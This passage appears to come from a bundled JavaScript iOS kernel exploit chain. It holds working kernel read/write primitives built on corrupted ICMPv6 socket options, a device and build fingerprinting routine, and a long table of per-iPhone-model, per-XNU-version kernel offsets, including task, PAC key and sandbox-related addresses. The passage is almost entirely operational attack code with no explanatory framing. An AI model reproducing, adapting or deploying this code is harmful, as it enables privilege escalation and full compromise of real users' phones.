EARLY_KRW_LENGTH;\n\t\t\t}\n\t\t\tif (!this.#kread32Bytes(address + read_offset, buffer + read_offset, read_size))\n\t\t\t\treturn false;\n\t\t\tremaining -= read_size;\n\t\t\tread_offset += read_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\t#kwriteLength(address, buffer, size) {\n\t\t//console.log(TAG, `kwrite(${address.toString(16)}, ${size})`);\n\n\t\tlet remaining = BigInt(size);\n\t\tlet write_offset = 0n;\n\t\tlet write_size = 0n;\n\t\n\t\twhile (remaining != 0n) {\n\t\t\tif (remaining >= EARLY_KRW_LENGTH) {\n\t\t\t\twrite_size = EARLY_KRW_LENGTH;\n\t\t\t} else {\n\t\t\t\twrite_size = remaining % EARLY_KRW_LENGTH;\n\t\t\t}\n\t\n\t\t\tlet kwrite_dst_addr = address + write_offset;\n\t\t\tlet kwrite_src_addr = buffer + write_offset;\n\t\n\t\t\tif (write_size != EARLY_KRW_LENGTH) {\n\t\t\t\tif (!this.#kread32Bytes(kwrite_dst_addr, this.#tmpWriteMem, EARLY_KRW_LENGTH))\n\t\t\t\t\treturn false;\n\t\t\t\tNative.callSymbol(\"memcpy\", this.#tmpWriteMem, kwrite_src_addr, write_size);\n\t\t\t\tkwrite_src_addr = this.#tmpWriteMem;\n\t\t\t}\n\t\n\t\t\tif (!this.#kwrite32Bytes(kwrite_dst_addr, kwrite_src_addr))\n\t\t\t\treturn false;\n\t\t\tremaining -= write_size;\n\t\t\twrite_offset += write_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\t#kread32Bytes(kaddr, buffer, len) {\n\t\tconst tmpBuff = Native.mem + 0x1000n;\n\n\t\t// Set \"kaddr\" address\n\t\tlet buff = new BigUint64Array(4);\n\t\tbuff[0] = kaddr;\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tlet ret = Native.callSymbol(\"setsockopt\", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt: \" + ret);\n\t\t\treturn false;\n\t\t}\n\n\t\tbuff[0] = BigInt(len);\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tret = Native.callSymbol(\"getsockopt\", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, tmpBuff);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"getsockopt failed reading \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kaddr));\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n\t#kwrite32Bytes(kaddr, buffer) {\n\t\tconst tmpBuff = Native.mem + 0x1000n;\n\n\t\t// Set \"kaddr\" address\n\t\tlet buff = new BigUint64Array(4);\n\t\tbuff[0] = kaddr;\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tlet ret = Native.callSymbol(\"setsockopt\", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt: \" + ret);\n\t\t\treturn false;\n\t\t}\n\n\t\tret = Native.callSymbol(\"setsockopt\", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt failed writing \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kaddr));\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Driver/Offsets.js\":\n/*!************************************!*\\\n  !*** ./src/libs/Driver/Offsets.js ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Offsets)\n/* harmony export */ });\n/* harmony import */ var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/OffsetsStruct */ \"./src/libs/Chain/OffsetsStruct.js\");\n/* harmony import */ var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./OffsetsTable */ \"./src/libs/Driver/OffsetsTable.js\");\n\n\n\nconst TAG  = \"OFFSETS\"\n\nclass Offsets\n{\n\tstatic getByDeviceAndVersion()\n\t{\n\t\tNative.callSymbol(\"uname\", Native.mem);\n\t\tconst sysname = Native.readString(Native.mem, 0x100);\n\t\tconst nodename = Native.readString(Native.mem + 0x100n, 0x100);\n\t\tconst release = Native.readString(Native.mem + 0x200n, 0x100);\n\t\tconst version = Native.readString(Native.mem + 0x300n, 0x100);\n\t\tconst machine = Native.readString(Native.mem + 0x400n, 0x100);\n\t\tconsole.log(TAG, `release: ${release} with machine: ${machine}`);\n\n\t\tconst buildVer = this.getBuildVersion();\n\t\tconsole.log(TAG, \"Build version: \" + buildVer);\n\n\t\tlet splittedVersion = release.split(\".\");\n\t\tlet xnuMajor = splittedVersion[0];\n\t\tlet xnuMinor = splittedVersion[1];\n\n\t\tlet splittedMachine = machine.split(\",\");\n\t\tlet deviceFamily = splittedMachine[0];\n\t\tlet deviceModel = splittedMachine[1];\n\n\t\tconsole.log(TAG, \"deviceFamily: \" + deviceFamily);\n\n\t\t// Ugly hack to support 17.7, 17.7.1 and 17.7.2\n\t\tif (buildVer) {\n\t\t\tif (buildVer == \"21H16\")\n\t\t\t\txnuMinor = 6.1;\n\t\t\telse if (buildVer == \"21H216\")\n\t\t\t\txnuMinor = 6.2;\n\t\t\telse if (buildVer == \"21H221\")\n\t\t\t\txnuMinor = 6.3;\n\t\t}\n\t\t// Get offsets per device family\n\t\tlet deviceOffsets = _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__.offsets[deviceFamily];\n\t\tif (!deviceOffsets) {\n\t\t\tconsole.log(TAG, `Unsupported machine: ${machine}`);\n\t\t\treturn null;\n\t\t}\n\n\t\tlet familyOffsets = deviceOffsets[\"*\"];\n\t\tlet foundFamilyOffsets = this.#getOffsetsByVersion(familyOffsets, xnuMajor, xnuMinor);\n\n\t\tif (!foundFamilyOffsets)\n\t\t\treturn null;\n\n\t\t// Adjustments per device model\n\t\tlet modelOffsets = deviceOffsets[deviceModel];\n\t\tlet foundModelOffsets = null;\n\t\tif (modelOffsets)\n\t\t\tfoundModelOffsets = this.#getOffsetsByVersion(modelOffsets, xnuMajor, xnuMinor);\n\n\t\t// Merge family offsets and device offsets\n\t\tlet foundOffsets = new libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"]();\n\t\tObject.assign(foundOffsets, foundFamilyOffsets);\n\t\tif (foundModelOffsets)\n\t\t\tObject.assign(foundOffsets, foundModelOffsets);\n\n\t\tif ([\"iPhone15\", \"iPhone16\", \"iPhone17\"].includes(deviceFamily))\n\t\t\tfoundOffsets.T1SZ_BOOT = 17n;\n\t\telse\n\t\t\tfoundOffsets.T1SZ_BOOT = 25n;\n\n\t\tconsole.log(TAG, \"Offsets: \" + JSON.stringify(foundOffsets, (_,v) => typeof v === 'bigint' ? \"0x\"+v.toString(16) : v, 2));\n\n\t\treturn foundOffsets;\n\t}\n\n\tstatic #getOffsetsByVersion(offsets, xnuMajor, xnuMinor) {\n\t\tlet xnuMajorOffsets = 0;\n\t\tfor (let major in offsets) {\n\t\t\tif (xnuMajor < major)\n\t\t\t\tcontinue;\n\t\t\tif (xnuMajorOffsets < major)\n\t\t\t\txnuMajorOffsets = major;\n\t\t}\n\n\t\tif (!xnuMajorOffsets) {\n\t\t\tconsole.log(TAG, \"Unsupported XNU major: \" + xnuMajor);\n\t\t\treturn null;\n\t\t}\n\n\t\t//console.log(TAG, \"Matching XNU major: \" + xnuMajorOffsets);\n\t\txnuMajorOffsets = offsets[xnuMajorOffsets];\n\n\t\tlet foundOffsets = {};\n\t\tlet xnuMinorOffsets = -1;\n\t\tconst sortedMinors = Object.keys(xnuMajorOffsets).sort();\n\t\tfor (let minor of sortedMinors) {\n\t\t\t//console.log(TAG, `minor: ${minor}, xnuMinor: ${xnuMinor}`);\n\t\t\tif (minor > xnuMinor)\n\t\t\t\tbreak;\n\t\t\tif (xnuMinorOffsets < minor) {\n\t\t\t\txnuMinorOffsets = minor;\n\t\t\t\tObject.assign(foundOffsets, xnuMajorOffsets[minor]);\n\t\t\t}\n\t\t}\n\n\t\t//console.log(TAG, \"Matching XNU minor: \" + xnuMinorOffsets);\n\n\t\treturn foundOffsets;\n\t}\n\tstatic getBuildVersion() {\n\t\tconst CTL_KERN = 1;\n\t\tconst KERN_OSVERSION = 65;\n\n\t\tconst mib = new ArrayBuffer(4 * 2);\n\t\tconst mibView = new DataView(mib);\n\t\tmibView.setInt32(0, CTL_KERN, true);\n\t\tmibView.setInt32(4, KERN_OSVERSION, true);\n\n\t\tconst mibAddr = Native.mem;\n\t\tconst resultAddr = Native.mem + 0x100n;\n\t\tconst lengthAddr = Native.mem + 0x200n;\n\n\t\tNative.write(Native.mem, mib);\n\n\t\tlet ret = Native.callSymbol(\"sysctl\", mibAddr, 2, resultAddr, lengthAddr, null, 0);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"Unable to get iOS build version\");\n\t\t\treturn null;\n\t\t}\n\n\t\tconst length = Native.read32(lengthAddr);\n\t\tconst buildVer = Native.readString(resultAddr, length);\n\t\treturn buildVer;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Driver/OffsetsTable.js\":\n/*!*****************************************!*\\\n  !*** ./src/libs/Driver/OffsetsTable.js ***!\n  \\*****************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   offsets: () => (/* binding */ offsets)\n/* harmony export */ });\nconst offsets = {\n\t// iPhone XS\n\t// iPhone XS Max\n\t// iPhone XS Max Global\n\t// iPhone XR\n\t\"iPhone11\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xe8n,\n\t\t\t\t\tropPid: 0x150n,\n\t\t\t\t\tjopPid: 0x158n,\n\t\t\t\t\tguardExcCode: 0x308n,\n\t\t\t\t\ttaskThreads: 0x348n,\n\t\t\t\t\ttro: 0x358n,\n\t\t\t\t\tast: 0x37cn,\n\t\t\t\t\tmutexData: 0x380n,\n\t\t\t\t\tctid: 0x408n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x918210n,\n\t\t\t\t\tguardExcCode: 0x318n,\n\t\t\t\t\ttaskThreads: 0x358n,\n\t\t\t\t\ttro: 0x368n,\n\t\t\t\t\tast: 0x38cn,\n\t\t\t\t\tmutexData: 0x398n,\n\t\t\t\t\tctid: 0x418n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x91c638n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x320n,\n\t\t\t\t\ttaskThreads: 0x360n,\n\t\t\t\t\ttro: 0x370n,\n\t\t\t\t\tast: 0x394n,\n\t\t\t\t\tmutexData: 0x3a0n,\n\t\t\t\t\tctid: 0x420n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x920a90n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9209f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x920a40n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f1548n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x320n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f1560n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x370n,\n\t\t\t\t\tast: 0x394n,\n\t\t\t\t\tmutexData: 0x3a0n,\n\t\t\t\t\tctid: 0x420n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fd988n,\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f5988n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa62b50n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6ac38n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6ad48n,\n  \t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x378n,\n  \t\t\t\t\ttro: 0x380n,\n  \t\t\t\t\tast: 0x3a4n,\n  \t\t\t\t\tmutexData: 0x3b0n,\n  \t\t\t\t\tctid: 0x430n,\n  \t\t\t\t\tmigLock: 0x36971f0n,\n  \t\t\t\t\tmigSbxMsg: 0x3697210n,\n  \t\t\t\t\tmigKernelStackLR: 0x2f7c1a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x8fc638n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x900a90n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9009f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x900a40n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9d1548n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9d1560n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9d9988n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9d1988n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa42b50n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n,\n\t\t\t\t\tmigLock: 0x38d74e8n,\n\t\t\t\t\tmigSbxMsg: 0x38d7508n,\n\t\t\t\t\tmigKernelStackLR: 0x31b19e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa4ad48n,\n\t\t\t\t\tmigLock: 0x352e1f0n,\n\t\t\t\t\tmigSbxMsg: 0x352e210n,\n\t\t\t\t\tmigKernelStackLR: 0x2e5ba20n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 11\n\t// iPhone 11 Pro\n\t// iPhone 11 Pro Max\n\t// iPhone SE 2\n\t\"iPhone12\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x96c178n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x970588n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9749d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa494a0n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa518c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa498c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n  \t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n  \t\t\t\t\ttro: 0x390n,\n  \t\t\t\t\tast: 0x3b4n,\n  \t\t\t\t\tmutexData: 0x3c0n,\n  \t\t\t\t\tctid: 0x440n,\n\t\t\t\t\tmigLock: 0x38e34e8n,\n\t\t\t\t\tmigSbxMsg: 0x38e3508n,\n\t\t\t\t\tmigKernelStackLR: 0x31ba7a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"3\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x974588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9789d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa4d4a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa558c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa4d8c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n\t\t\t\t\tmigLock: 0x38e7468n,\n\t\t\t\t\tmigSbxMsg: 0x38e7488n,\n\t\t\t\t\tmigKernelStackLR: 0x31bf5a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x974588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9789d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa4d4a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa558c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa4d8c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n\t\t\t\t\tmigLock: 0x38e7468n,\n\t\t\t\t\tmigSbxMsg: 0x38e7488n,\n\t\t\t\t\tmigKernelStackLR: 0x31bf5a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x960588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9649d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x964938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x964988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa35488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa354a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3d8c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa358c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xab6a90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xabeb78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xac2c88n,\n\t\t\t\t\tmigLock: 0x387a8e8n,\n\t\t\t\t\tmigSbxMsg: 0x387a908n,\n\t\t\t\t\tmigKernelStackLR: 0x3156f20n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 12\n\t// iPhone 12 Mini\n\t// iPhone 12 Pro\n\t// iPhone 12 Pro Max\n\t\"iPhone13\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x318n,\n\t\t\t\t\ttaskThreads: 0x358n,\n\t\t\t\t\ttro: 0x368n,\n\t\t\t\t\tast: 0x38cn,\n\t\t\t\t\tmutexData: 0x390n,\n\t\t\t\t\tctid: 0x418n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x94c2d0n,\n\t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x9546e0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x954b30n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x954a90n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x954ae0n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa295e0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2d5f8n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa35a20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa2da20n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa9ebe8n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n,\n\t\t\t\t\tmigLock: 0x37b8b80n,\n\t\t\t\t\tmigSbxMsg: 0x37b8ba0n,\n\t\t\t\t\tmigKernelStackLR: 0x3190fa0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa6cd0n,\n\t\t\t\t\tmigLock: 0x37d4c90n,\n\t\t\t\t\tmigSbxMsg: 0x37d4cb0n,\n\t\t\t\t\tmigKernelStackLR: 0x31acce4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaaade0n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n,\n\t\t\t\t\tmigLock: 0x37dcc90n,\n\t\t\t\t\tmigSbxMsg: 0x37dccb0n,\n\t\t\t\t\tmigKernelStackLR: 0x31b5b60n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 13\n\t// iPhone 13 Mini\n\t// iPhone 13 Pro\n\t// iPhone 13 Pro Max\n\t// iPhone SE 3\n\t// iPhone 14\n\t// iPhone 14 Plus\n\t\"iPhone14\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 